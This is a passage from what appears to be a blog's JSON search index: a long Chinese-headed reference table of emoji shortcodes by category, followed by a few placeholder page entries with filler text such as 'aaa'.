family_woman_boy   :family_woman_boy_boy: family_woman_boy_boy :family_woman_girl: family_woman_girl   :family_woman_girl_boy: family_woman_girl_boy :family_woman_girl_girl: family_woman_girl_girl    人物符号    图标 代码 图标 代码     :speaking_head: speaking_head :bust_in_silhouette: bust_in_silhouette   :busts_in_silhouette: busts_in_silhouette :footprints: footprints    动物与自然 哺乳动物    图标 代码 图标 代码     :monkey_face: monkey_face :monkey: monkey   :gorilla: gorilla :dog: dog   :dog2: dog2 :poodle: poodle   :wolf: wolf :fox_face: fox_face   :cat: cat :cat2: cat2   :lion: lion :tiger: tiger   :tiger2: tiger2 :leopard: leopard   :horse: horse :racehorse: racehorse   :unicorn: unicorn :deer: deer   :cow: cow :ox: ox   :water_buffalo: water_buffalo :cow2: cow2   :pig: pig :pig2: pig2   :boar: boar :pig_nose: pig_nose   :ram: ram :sheep: sheep   :goat: goat :dromedary_camel: dromedary_camel   :camel: camel :elephant: elephant   :rhinoceros: rhinoceros :mouse: mouse   :mouse2: mouse2 :rat: rat   :hamster: hamster :rabbit: rabbit   :rabbit2: rabbit2 :chipmunk: chipmunk   :bat: bat :bear: bear   :koala: koala :panda_face: panda_face   :feet: feet paw_prints      鸟类    图标 代码 图标 代码     :turkey: turkey :chicken: chicken   :rooster: rooster :hatching_chick: hatching_chick   :baby_chick: baby_chick :hatched_chick: hatched_chick   :bird: bird :penguin: penguin   :dove: dove :eagle: eagle   :duck: duck :owl: owl    两栖动物    icon code icon code     :frog: frog      爬虫类    图标 代码 图标 代码     :crocodile: crocodile :turtle: turtle   :lizard: lizard :snake: snake   :dragon_face: dragon_face :dragon: dragon    海洋动物    图标 代码 图标 代码     :whale: whale :whale2: whale2   :dolphin: dolphin flipper :fish: fish   :tropical_fish: tropical_fish :blowfish: blowfish   :shark: shark :octopus: octopus   :shell: shell      虫类    图标 代码 图标 代码     :snail: snail :butterfly: butterfly   :bug: bug :ant: ant   :bee: bee honeybee :beetle: beetle   :spider: spider :spider_web: spider_web   :scorpion: scorpion      花类植物    图标 代码 图标 代码     :bouquet: bouquet :cherry_blossom: cherry_blossom   :white_flower: white_flower :rosette: rosette   :rose: rose :wilted_flower: wilted_flower   :hibiscus: hibiscus :sunflower: sunflower   :blossom: blossom :tulip: tulip    其它植物    图标 代码 图标 代码     :seedling: seedling :evergreen_tree: evergreen_tree   :deciduous_tree: deciduous_tree :palm_tree: palm_tree   :cactus: cactus :ear_of_rice: ear_of_rice   :herb: herb :shamrock: shamrock   :four_leaf_clover: four_leaf_clover :maple_leaf: maple_leaf   :fallen_leaf: fallen_leaf :leaves: leaves    食物与饮料 水果    图标 代码 图标 代码     :grapes: grapes :melon: melon   :watermelon: watermelon :mandarin: mandarin orange tangerine   :lemon: lemon :banana: banana   :pineapple: pineapple :apple: apple   :green_apple: green_apple :pear: pear   :peach: peach :cherries: cherries   :strawberry: strawberry :kiwi_fruit: kiwi_fruit   :tomato: tomato      蔬菜    图标 代码 图标 代码     :avocado: avocado :eggplant: eggplant   :potato: potato :carrot: carrot   :corn: corn :hot_pepper: hot_pepper   :cucumber: cucumber :mushroom: mushroom   :peanuts: peanuts :chestnut: chestnut    快餐    图标 代码 图标 代码     :bread: bread :croissant: croissant   :baguette_bread: baguette_bread :pancakes: pancakes   :cheese: cheese :meat_on_bone: meat_on_bone   :poultry_leg: poultry_leg :bacon: bacon   :hamburger: hamburger :fries: fries   :pizza: pizza :hotdog: hotdog   :taco: taco :burrito: burrito   :stuffed_flatbread: stuffed_flatbread :egg: egg   :fried_egg: fried_egg :shallow_pan_of_food: shallow_pan_of_food   :stew: stew :green_salad: green_salad   :popcorn: popcorn      亚洲食物    图标 代码 图标 代码     :bento: bento :rice_cracker: rice_cracker   :rice_ball: rice_ball :rice: rice   :curry: curry :ramen: ramen   :spaghetti: spaghetti :sweet_potato: sweet_potato   :oden: oden :sushi: sushi   :fried_shrimp: fried_shrimp :fish_cake: fish_cake   :dango: dango      海鲜    图标 代码 图标 代码     :crab: crab :shrimp: shrimp   :squid: squid      甜点    图标 代码 图标 代码     :icecream: icecream :shaved_ice: shaved_ice   :ice_cream: ice_cream :doughnut: doughnut   :cookie: cookie :birthday: birthday   :cake: cake :chocolate_bar: chocolate_bar   :candy: candy :lollipop: lollipop   :custard: custard :honey_pot: honey_pot    饮料    图标 代码 图标 代码     :baby_bottle: baby_bottle :milk_glass: milk_glass   :coffee: coffee :tea: tea   :sake: sake :champagne: champagne   :wine_glass: wine_glass :cocktail: cocktail   :tropical_drink: tropical_drink :beer: beer   :beers: beers :clinking_glasses: clinking_glasses   :tumbler_glass: tumbler_glass      餐具    图标 代码 图标 代码     :plate_with_cutlery: plate_with_cutlery :fork_and_knife: fork_and_knife   :spoon: spoon :hocho: hocho knife   :amphora: amphora      旅游与地理 地图    图标 代码 图标 代码     :earth_africa: earth_africa :earth_americas: earth_americas   :earth_asia: earth_asia :globe_with_meridians: globe_with_meridians   :world_map: world_map :japan: japan    地理现象    图标 代码 图标 代码     :mountain_snow: mountain_snow :mountain: mountain   :volcano: volcano :mount_fuji: mount_fuji   :camping: camping :beach_umbrella: beach_umbrella   :desert: desert :desert_island: desert_island   :national_park: national_park      建筑物    图标 代码 图标 代码     :stadium: stadium :classical_building: classical_building   :building_construction: building_construction :houses: houses   :derelict_house: derelict_house :house: house   :house_with_garden: house_with_garden :office: office   :post_office: post_office :european_post_office: european_post_office   :hospital: hospital :bank: bank   :hotel: hotel :love_hotel: love_hotel   :convenience_store: convenience_store :school: school   :department_store: department_store :factory: factory   :japanese_castle: japanese_castle :european_castle: european_castle   :wedding: wedding :tokyo_tower: tokyo_tower   :statue_of_liberty: statue_of_liberty      宗教建筑    图标 代码 图标 代码     :church: church :mosque: mosque   :synagogue: synagogue :shinto_shrine: shinto_shrine   :kaaba: kaaba      其它地点    图标 代码 图标 代码     :fountain: fountain :tent: tent   :foggy: foggy :night_with_stars: night_with_stars   :cityscape: cityscape :sunrise_over_mountains: sunrise_over_mountains   :sunrise: sunrise :city_sunset: city_sunset   :city_sunrise: city_sunrise :bridge_at_night: bridge_at_night   :hotsprings: hotsprings :carousel_horse: carousel_horse   :ferris_wheel: ferris_wheel :roller_coaster: roller_coaster   :barber: barber :circus_tent: circus_tent    陆路运输    图标 代码 图标 代码     :steam_locomotive: steam_locomotive :railway_car: railway_car   :bullettrain_side: bullettrain_side :bullettrain_front: bullettrain_front   :train2: train2 :metro: metro   :light_rail: light_rail :station: station   :tram: tram :monorail: monorail   :mountain_railway: mountain_railway :train: train   :bus: bus :oncoming_bus: oncoming_bus   :trolleybus: trolleybus :minibus: minibus   :ambulance: ambulance :fire_engine: fire_engine   :police_car: police_car :oncoming_police_car: oncoming_police_car   :taxi: taxi :oncoming_taxi: oncoming_taxi   :car: car red_car :oncoming_automobile: oncoming_automobile   :blue_car: blue_car :truck: truck   :articulated_lorry: articulated_lorry :tractor: tractor   :racing_car: racing_car :motorcycle: motorcycle   :motor_scooter: motor_scooter :bike: bike   :kick_scooter: kick_scooter :busstop: busstop   :motorway: motorway :railway_track: railway_track   :oil_drum: oil_drum :fuelpump: fuelpump   :rotating_light: rotating_light :traffic_light: traffic_light   :vertical_traffic_light: vertical_traffic_light :stop_sign: stop_sign   :construction: construction      水路运输    图标 代码 图标 代码     :anchor: anchor :boat: boat sailboat   :canoe: canoe :speedboat: speedboat   :passenger_ship: passenger_ship :ferry: ferry   :motor_boat: motor_boat :ship: ship    空中运输    图标 代码 图标 代码     :airplane: airplane :small_airplane: small_airplane   :flight_departure: flight_departure :flight_arrival: flight_arrival   :seat: seat :helicopter: helicopter   :suspension_railway: suspension_railway :mountain_cableway: mountain_cableway   :aerial_tramway: aerial_tramway :artificial_satellite: artificial_satellite   :rocket: rocket      旅馆    icon code icon code     :bellhop_bell: bellhop_bell      时间    图标 代码 图标 代码     :hourglass: hourglass :hourglass_flowing_sand: hourglass_flowing_sand   :watch: watch :alarm_clock: alarm_clock   :stopwatch: stopwatch :timer_clock: timer_clock   :mantelpiece_clock: mantelpiece_clock :clock12: clock12   :clock1230: clock1230 :clock1: clock1   :clock130: clock130 :clock2: clock2   :clock230: clock230 :clock3: clock3   :clock330: clock330 :clock4: clock4   :clock430: clock430 :clock5: clock5   :clock530: clock530 :clock6: clock6   :clock630: clock630 :clock7: clock7   :clock730: clock730 :clock8: clock8   :clock830: clock830 :clock9: clock9   :clock930: clock930 :clock10: clock10   :clock1030: clock1030 :clock11: clock11   :clock1130: clock1130      天空与天气    图标 代码 图标 代码     :new_moon: new_moon :waxing_crescent_moon: waxing_crescent_moon   :first_quarter_moon: first_quarter_moon :moon: moon waxing_gibbous_moon   :full_moon: full_moon :waning_gibbous_moon: waning_gibbous_moon   :last_quarter_moon: last_quarter_moon :waning_crescent_moon: waning_crescent_moon   :crescent_moon: crescent_moon :new_moon_with_face: new_moon_with_face   :first_quarter_moon_with_face: first_quarter_moon_with_face :last_quarter_moon_with_face: last_quarter_moon_with_face   :thermometer: thermometer :sunny: sunny   :full_moon_with_face: full_moon_with_face :sun_with_face: sun_with_face   :star: star :star2: star2   :stars: stars :milky_way: milky_way   :cloud: cloud :partly_sunny: partly_sunny   :cloud_with_lightning_and_rain: cloud_with_lightning_and_rain :sun_behind_small_cloud: sun_behind_small_cloud   :sun_behind_large_cloud: sun_behind_large_cloud :sun_behind_rain_cloud: sun_behind_rain_cloud   :cloud_with_rain: cloud_with_rain :cloud_with_snow: cloud_with_snow   :cloud_with_lightning: cloud_with_lightning :tornado: tornado   :fog: fog :wind_face: wind_face   :cyclone: cyclone :rainbow: rainbow   :closed_umbrella: closed_umbrella :open_umbrella: open_umbrella   :umbrella: umbrella :parasol_on_ground: parasol_on_ground   :zap: zap :snowflake: snowflake   :snowman_with_snow: snowman_with_snow :snowman: snowman   :comet: comet :fire: fire   :droplet: droplet :ocean: ocean    活动 事件    图标 代码 图标 代码     :jack_o_lantern: jack_o_lantern :christmas_tree: christmas_tree   :fireworks: fireworks :sparkler: sparkler   :sparkles: sparkles :balloon: balloon   :tada: tada :confetti_ball: confetti_ball   :tanabata_tree: tanabata_tree :bamboo: bamboo   :dolls: dolls :flags: flags   :wind_chime: wind_chime :rice_scene: rice_scene   :ribbon: ribbon :gift: gift   :reminder_ribbon: reminder_ribbon :tickets: tickets   :ticket: ticket      奖杯与奖牌    图标 代码 图标 代码     :medal_military: medal_military :trophy: trophy   :medal_sports: medal_sports :1st_place_medal: 1st_place_medal   :2nd_place_medal: 2nd_place_medal :3rd_place_medal: 3rd_place_medal    体育运动    图标 代码 图标 代码     :soccer: soccer :baseball: baseball   :basketball: basketball :volleyball: volleyball   :football: football :rugby_football: rugby_football   :tennis: tennis :bowling: bowling   :cricket: cricket :field_hockey: field_hockey   :ice_hockey: ice_hockey :ping_pong: ping_pong   :badminton: badminton :boxing_glove: boxing_glove   :martial_arts_uniform: martial_arts_uniform :goal_net: goal_net   :golf: golf :ice_skate: ice_skate   :fishing_pole_and_fish: fishing_pole_and_fish :running_shirt_with_sash: running_shirt_with_sash   :ski: ski      游戏    图标 代码 图标 代码     :dart: dart :8ball: 8ball   :crystal_ball: crystal_ball :video_game: video_game   :joystick: joystick :slot_machine: slot_machine   :game_die: game_die :spades: spades   :hearts: hearts :diamonds: diamonds   :clubs: clubs :black_joker: black_joker   :mahjong: mahjong :flower_playing_cards: flower_playing_cards    艺术与工艺    图标 代码 图标 代码     :performing_arts: performing_arts :framed_picture: framed_picture   :art: art      物品 服装    图标 代码 图标 代码     :eyeglasses: eyeglasses :dark_sunglasses: dark_sunglasses   :necktie: necktie :shirt: shirt tshirt   :jeans: jeans :dress: dress   :kimono: kimono :bikini: bikini   :womans_clothes: womans_clothes :purse: purse   :handbag: handbag :pouch: pouch   :shopping: shopping :school_satchel: school_satchel   :mans_shoe: mans_shoe shoe :athletic_shoe: athletic_shoe   :high_heel: high_heel :sandal: sandal   :boot: boot :crown: crown   :womans_hat: womans_hat :tophat: tophat   :mortar_board: mortar_board :rescue_worker_helmet: rescue_worker_helmet   :prayer_beads: prayer_beads :lipstick: lipstick   :ring: ring :gem: gem    声音    图标 代码 图标 代码     :mute: mute :speaker: speaker   :sound: sound :loud_sound: loud_sound   :loudspeaker: loudspeaker :mega: mega   :postal_horn: postal_horn :bell: bell   :no_bell: no_bell      音乐    图标 代码 图标 代码     :musical_score: musical_score :musical_note: musical_note   :notes: notes :studio_microphone: studio_microphone   :level_slider: level_slider :control_knobs: control_knobs   :microphone: microphone :headphones: headphones   :radio: radio      乐器    图标 代码 图标 代码     :saxophone: saxophone :guitar: guitar   :musical_keyboard: musical_keyboard :trumpet: trumpet   :violin: violin :drum: drum    电话    图标 代码 图标 代码     :iphone: iphone :calling: calling   :phone: phone telephone :telephone_receiver: telephone_receiver   :pager: pager :fax: fax    电脑    图标 代码 图标 代码     :battery: battery :electric_plug: electric_plug   :computer: computer :desktop_computer: desktop_computer   :printer: printer :keyboard: keyboard   :computer_mouse: computer_mouse :trackball: trackball   :minidisc: minidisc :floppy_disk: floppy_disk   :cd: cd :dvd: dvd    灯光与影像    图标 代码 图标 代码     :movie_camera: movie_camera :film_strip: film_strip   :film_projector: film_projector :clapper: clapper   :tv: tv :camera: camera   :camera_flash: camera_flash :video_camera: video_camera   :vhs: vhs :mag: mag   :mag_right: mag_right :candle: candle   :bulb: bulb :flashlight: flashlight   :izakaya_lantern: izakaya_lantern lantern      书与纸张    图标 代码 图标 代码     :notebook_with_decorative_cover: notebook_with_decorative_cover :closed_book: closed_book   :book: book open_book :green_book: green_book   :blue_book: blue_book :orange_book: orange_book   :books: books :notebook: notebook   :ledger: ledger :page_with_curl: page_with_curl   :scroll: scroll :page_facing_up: page_facing_up   :newspaper: newspaper :newspaper_roll: newspaper_roll   :bookmark_tabs: bookmark_tabs :bookmark: bookmark   :label: label      钱    图标 代码 图标 代码     :moneybag: moneybag :yen: yen   :dollar: dollar :euro: euro   :pound: pound :money_with_wings: money_with_wings   :credit_card: credit_card :chart: chart    邮件    图标 代码 图标 代码     :email: email envelope :e-mail: :e-mail:   :incoming_envelope: incoming_envelope :envelope_with_arrow: envelope_with_arrow   :outbox_tray: outbox_tray :inbox_tray: inbox_tray   :package: package :mailbox: mailbox   :mailbox_closed: mailbox_closed :mailbox_with_mail: mailbox_with_mail   :mailbox_with_no_mail: mailbox_with_no_mail :postbox: postbox   :ballot_box: ballot_box      书写    图标 代码 图标 代码     :pencil2: pencil2 :black_nib: black_nib   :fountain_pen: fountain_pen :pen: pen   :paintbrush: paintbrush :crayon: crayon   :memo: memo pencil      办公    图标 代码 图标 代码     :briefcase: briefcase :file_folder: file_folder   :open_file_folder: open_file_folder :card_index_dividers: card_index_dividers   :date: date :calendar: calendar   :spiral_notepad: spiral_notepad :spiral_calendar: spiral_calendar   :card_index: card_index :chart_with_upwards_trend: chart_with_upwards_trend   :chart_with_downwards_trend: chart_with_downwards_trend :bar_chart: bar_chart   :clipboard: clipboard :pushpin: pushpin   :round_pushpin: round_pushpin :paperclip: paperclip   :paperclips: paperclips :straight_ruler: straight_ruler   :triangular_ruler: triangular_ruler :scissors: scissors   :card_file_box: card_file_box :file_cabinet: file_cabinet   :wastebasket: wastebasket      锁    图标 代码 图标 代码     :lock: lock :unlock: unlock   :lock_with_ink_pen: lock_with_ink_pen :closed_lock_with_key: closed_lock_with_key   :key: key :old_key: old_key    工具    图标 代码 图标 代码     :hammer: hammer :pick: pick   :hammer_and_pick: hammer_and_pick :hammer_and_wrench: hammer_and_wrench   :dagger: dagger :crossed_swords: crossed_swords   :gun: gun :bow_and_arrow: bow_and_arrow   :shield: shield :wrench: wrench   :nut_and_bolt: nut_and_bolt :gear: gear   :clamp: clamp :balance_scale: balance_scale   :link: link :chains: chains    科学    图标 代码 图标 代码     :alembic: alembic :microscope: microscope   :telescope: telescope :satellite: satellite    医疗    图标 代码 图标 代码     :syringe: syringe :pill: pill    生活用品    图标 代码 图标 代码     :door: door :bed: bed   :couch_and_lamp: couch_and_lamp :toilet: toilet   :shower: shower :bathtub: bathtub   :shopping_cart: shopping_cart      其它物品    图标 代码 图标 代码     :smoking: smoking :coffin: coffin   :funeral_urn: funeral_urn :moyai: moyai    符号 交通标识    图标 代码 图标 代码     :atm: atm :put_litter_in_its_place: put_litter_in_its_place   :potable_water: potable_water :wheelchair: wheelchair   :mens: mens :womens: womens   :restroom: restroom :baby_symbol: baby_symbol   :wc: wc :passport_control: passport_control   :customs: customs :baggage_claim: baggage_claim   :left_luggage: left_luggage      警告    图标 代码 图标 代码     :warning: warning :children_crossing: children_crossing   :no_entry: no_entry :no_entry_sign: no_entry_sign   :no_bicycles: no_bicycles :no_smoking: no_smoking   :do_not_litter: do_not_litter :non-potable_water: :non-potable_water:   :no_pedestrians: no_pedestrians :no_mobile_phones: no_mobile_phones   :underage: underage :radioactive: radioactive   :biohazard: biohazard      箭头    图标 代码 图标 代码     :arrow_up: arrow_up :arrow_upper_right: arrow_upper_right   :arrow_right: arrow_right :arrow_lower_right: arrow_lower_right   :arrow_down: arrow_down :arrow_lower_left: arrow_lower_left   :arrow_left: arrow_left :arrow_upper_left: arrow_upper_left   :arrow_up_down: arrow_up_down :left_right_arrow: left_right_arrow   :leftwards_arrow_with_hook: leftwards_arrow_with_hook :arrow_right_hook: arrow_right_hook   :arrow_heading_up: arrow_heading_up :arrow_heading_down: arrow_heading_down   :arrows_clockwise: arrows_clockwise :arrows_counterclockwise: arrows_counterclockwise   :back: back :end: end   :on: on :soon: soon   :top: top      宗教    图标 代码 图标 代码     :place_of_worship: place_of_worship :atom_symbol: atom_symbol   :om: om :star_of_david: star_of_david   :wheel_of_dharma: wheel_of_dharma :yin_yang: yin_yang   :latin_cross: latin_cross :orthodox_cross: orthodox_cross   :star_and_crescent: star_and_crescent :peace_symbol: peace_symbol   :menorah: menorah :six_pointed_star: six_pointed_star    生肖    图标 代码 图标 代码     :aries: aries :taurus: taurus   :gemini: gemini :cancer: cancer   :leo: leo :virgo: virgo   :libra: libra :scorpius: scorpius   :sagittarius: sagittarius :capricorn: capricorn   :aquarius: aquarius :pisces: pisces   :ophiuchus: ophiuchus      影像符号    图标 代码 图标 代码     :twisted_rightwards_arrows: twisted_rightwards_arrows :repeat: repeat   :repeat_one: repeat_one :arrow_forward: arrow_forward   :fast_forward: fast_forward :next_track_button: next_track_button   :play_or_pause_button: play_or_pause_button :arrow_backward: arrow_backward   :rewind: rewind :previous_track_button: previous_track_button   :arrow_up_small: arrow_up_small :arrow_double_up: arrow_double_up   :arrow_down_small: arrow_down_small :arrow_double_down: arrow_double_down   :pause_button: pause_button :stop_button: stop_button   :record_button: record_button :cinema: cinema   :low_brightness: low_brightness :high_brightness: high_brightness   :signal_strength: signal_strength :vibration_mode: vibration_mode   :mobile_phone_off: mobile_phone_off      数学    图标 代码 图标 代码     :heavy_multiplication_x: heavy_multiplication_x :heavy_plus_sign: heavy_plus_sign   :heavy_minus_sign: heavy_minus_sign :heavy_division_sign: heavy_division_sign    标点符号    图标 代码 图标 代码     :bangbang: bangbang :interrobang: interrobang   :question: question :grey_question: grey_question   :grey_exclamation: grey_exclamation :exclamation: exclamation heavy_exclamation_mark   :wavy_dash: wavy_dash      货币    图标 代码 图标 代码     :currency_exchange: currency_exchange :heavy_dollar_sign: heavy_dollar_sign    按键符号    图标 代码 图标 代码     :hash: hash :asterisk: asterisk   :zero: zero :one: one   :two: two :three: three   :four: four :five: five   :six: six :seven: seven   :eight: eight :nine: nine   :keycap_ten: keycap_ten      字母符号    图标 代码 图标 代码     :capital_abcd: capital_abcd :abcd: abcd   :1234: 1234 :symbols: symbols   :abc: abc :a: a   :ab: ab :b: b   :cl: cl :cool: cool   :free: free :information_source: information_source   :id: id :m: m   :new: new :ng: ng   :o2: o2 :ok: ok   :parking: parking :sos: sos   :up: up :vs: vs   :koko: koko :sa: sa   :u6708: u6708 :u6709: u6709   :u6307: u6307 :ideograph_advantage: ideograph_advantage   :u5272: u5272 :u7121: u7121   :u7981: u7981 :accept: accept   :u7533: u7533 :u5408: u5408   :u7a7a: u7a7a :congratulations: congratulations   :secret: secret :u55b6: u55b6   :u6e80: u6e80      几何符号    图标 代码 图标 代码     :red_circle: red_circle :large_blue_circle: large_blue_circle   :black_circle: black_circle :white_circle: white_circle   :black_large_square: black_large_square :white_large_square: white_large_square   :black_medium_square: black_medium_square :white_medium_square: white_medium_square   :black_medium_small_square: black_medium_small_square :white_medium_small_square: white_medium_small_square   :black_small_square: black_small_square :white_small_square: white_small_square   :large_orange_diamond: large_orange_diamond :large_blue_diamond: large_blue_diamond   :small_orange_diamond: small_orange_diamond :small_blue_diamond: small_blue_diamond   :small_red_triangle: small_red_triangle :small_red_triangle_down: small_red_triangle_down   :diamond_shape_with_a_dot_inside: diamond_shape_with_a_dot_inside :radio_button: radio_button   :white_square_button: white_square_button :black_square_button: black_square_button    其它符合    图标 代码 图标 代码     :recycle: recycle :fleur_de_lis: fleur_de_lis   :trident: trident :name_badge: name_badge   :beginner: beginner :o: o   :white_check_mark: white_check_mark :ballot_box_with_check: ballot_box_with_check   :heavy_check_mark: heavy_check_mark :x: x   :negative_squared_cross_mark: negative_squared_cross_mark :curly_loop: curly_loop   :loop: loop :part_alternation_mark: part_alternation_mark   :eight_spoked_asterisk: eight_spoked_asterisk :eight_pointed_black_star: eight_pointed_black_star   :sparkle: sparkle :copyright: copyright   :registered: registered :tm: tm    旗帜 常用旗帜    图标 代码 图标 代码     :checkered_flag: checkered_flag :triangular_flag_on_post: triangular_flag_on_post   :crossed_flags: crossed_flags :black_flag: black_flag   :white_flag: white_flag :rainbow_flag: rainbow_flag    国家和地区旗帜    图标 代码 图标 代码     :andorra: andorra :united_arab_emirates: united_arab_emirates   :afghanistan: afghanistan :antigua_barbuda: antigua_barbuda   :anguilla: anguilla :albania: albania   :armenia: armenia :angola: angola   :antarctica: antarctica :argentina: argentina   :american_samoa: american_samoa :austria: austria   :australia: australia :aruba: aruba   :aland_islands: aland_islands :azerbaijan: azerbaijan   :bosnia_herzegovina: bosnia_herzegovina :barbados: barbados   :bangladesh: bangladesh :belgium: belgium   :burkina_faso: burkina_faso :bulgaria: bulgaria   :bahrain: bahrain :burundi: burundi   :benin: benin :st_barthelemy: st_barthelemy   :bermuda: bermuda :brunei: brunei   :bolivia: bolivia :caribbean_netherlands: caribbean_netherlands   :brazil: brazil :bahamas: bahamas   :bhutan: bhutan :botswana: botswana   :belarus: belarus :belize: belize   :canada: canada :cocos_islands: cocos_islands   :congo_kinshasa: congo_kinshasa :central_african_republic: central_african_republic   :congo_brazzaville: congo_brazzaville :switzerland: switzerland   :cote_divoire: cote_divoire :cook_islands: cook_islands   :chile: chile :cameroon: cameroon   :cn: cn :colombia: colombia   :costa_rica: costa_rica :cuba: cuba   :cape_verde: cape_verde :curacao: curacao   :christmas_island: christmas_island :cyprus: cyprus   :czech_republic: czech_republic :de: de   :djibouti: djibouti :denmark: denmark   :dominica: dominica :dominican_republic: dominican_republic   :algeria: algeria :ecuador: ecuador   :estonia: estonia :egypt: egypt   :western_sahara: western_sahara :eritrea: eritrea   :es: es :ethiopia: ethiopia   :eu: eu european_union :finland: finland   :fiji: fiji :falkland_islands: falkland_islands   :micronesia: micronesia :faroe_islands: faroe_islands   :fr: fr :gabon: gabon   :gb: gb uk :grenada: grenada   :georgia: georgia :french_guiana: french_guiana   :guernsey: guernsey :ghana: ghana   :gibraltar: gibraltar :greenland: greenland   :gambia: gambia :guinea: guinea   :guadeloupe: guadeloupe :equatorial_guinea: equatorial_guinea   :greece: greece :south_georgia_south_sandwich_islands: south_georgia_south_sandwich_islands   :guatemala: guatemala :guam: guam   :guinea_bissau: guinea_bissau :guyana: guyana   :hong_kong: hong_kong :honduras: honduras   :croatia: croatia :haiti: haiti   :hungary: hungary :canary_islands: canary_islands   :indonesia: indonesia :ireland: ireland   :israel: israel :isle_of_man: isle_of_man   :india: india :british_indian_ocean_territory: british_indian_ocean_territory   :iraq: iraq :iran: iran   :iceland: iceland :it: it   :jersey: jersey :jamaica: jamaica   :jordan: jordan :jp: jp   :kenya: kenya :kyrgyzstan: kyrgyzstan   :cambodia: cambodia :kiribati: kiribati   :comoros: comoros :st_kitts_nevis: st_kitts_nevis   :north_korea: north_korea :kr: kr   :kuwait: kuwait :cayman_islands: cayman_islands   :kazakhstan: kazakhstan :laos: laos   :lebanon: lebanon :st_lucia: st_lucia   :liechtenstein: liechtenstein :sri_lanka: sri_lanka   :liberia: liberia :lesotho: lesotho   :lithuania: lithuania :luxembourg: luxembourg   :latvia: latvia :libya: libya   :morocco: morocco :monaco: monaco   :moldova: moldova :montenegro: montenegro   :madagascar: madagascar :marshall_islands: marshall_islands   :macedonia: macedonia :mali: mali   :myanmar: myanmar :mongolia: mongolia   :macau: macau :northern_mariana_islands: northern_mariana_islands   :martinique: martinique :mauritania: mauritania   :montserrat: montserrat :malta: malta   :mauritius: mauritius :maldives: maldives   :malawi: malawi :mexico: mexico   :malaysia: malaysia :mozambique: mozambique   :namibia: namibia :new_caledonia: new_caledonia   :niger: niger :norfolk_island: norfolk_island   :nigeria: nigeria :nicaragua: nicaragua   :netherlands: netherlands :norway: norway   :nepal: nepal :nauru: nauru   :niue: niue :new_zealand: new_zealand   :oman: oman :panama: panama   :peru: peru :french_polynesia: french_polynesia   :papua_new_guinea: papua_new_guinea :philippines: philippines   :pakistan: pakistan :poland: poland   :st_pierre_miquelon: st_pierre_miquelon :pitcairn_islands: pitcairn_islands   :puerto_rico: puerto_rico :palestinian_territories: palestinian_territories   :portugal: portugal :palau: palau   :paraguay: paraguay :qatar: qatar   :reunion: reunion :romania: romania   :serbia: serbia :ru: ru   :rwanda: rwanda :saudi_arabia: saudi_arabia   :solomon_islands: solomon_islands :seychelles: seychelles   :sudan: sudan :sweden: sweden   :singapore: singapore :st_helena: st_helena   :slovenia: slovenia :slovakia: slovakia   :sierra_leone: sierra_leone :san_marino: san_marino   :senegal: senegal :somalia: somalia   :suriname: suriname :south_sudan: south_sudan   :sao_tome_principe: sao_tome_principe :el_salvador: el_salvador   :sint_maarten: sint_maarten :syria: syria   :swaziland: swaziland :turks_caicos_islands: turks_caicos_islands   :chad: chad :french_southern_territories: french_southern_territories   :togo: togo :thailand: thailand   :tajikistan: tajikistan :tokelau: tokelau   :timor_leste: timor_leste :turkmenistan: turkmenistan   :tunisia: tunisia :tonga: tonga   :tr: tr :trinidad_tobago: trinidad_tobago   :tuvalu: tuvalu :taiwan: taiwan   :tanzania: tanzania :ukraine: ukraine   :uganda: uganda :us: us   :uruguay: uruguay :uzbekistan: uzbekistan   :vatican_city: vatican_city :st_vincent_grenadines: st_vincent_grenadines   :venezuela: venezuela :british_virgin_islands: british_virgin_islands   :us_virgin_islands: us_virgin_islands :vietnam: vietnam   :vanuatu: vanuatu :wallis_futuna: wallis_futuna   :samoa: samoa :kosovo: kosovo   :yemen: yemen :mayotte: mayotte   :south_africa: south_africa :zambia: zambia   :zimbabwe: zimbabwe     ","permalink":"https://examplesite.com/posts/20150902/","summary":"","title":"Emoji 支持"},{"content":"aaa\n","permalink":"https://examplesite.com/love/","summary":"aaa","title":"Love"},{"content":"ss\n","permalink":"https://examplesite.com/posts/20150901/","summary":"","title":"Markdown 基本语法"},{"content":"aa\n","permalink":"https://examplesite.com/about/","summary":"aa","title":"关于"},{"content":"aaa\n","permalink":"https://examplesite.com/link/","summary":"aaa","title":"友链"}]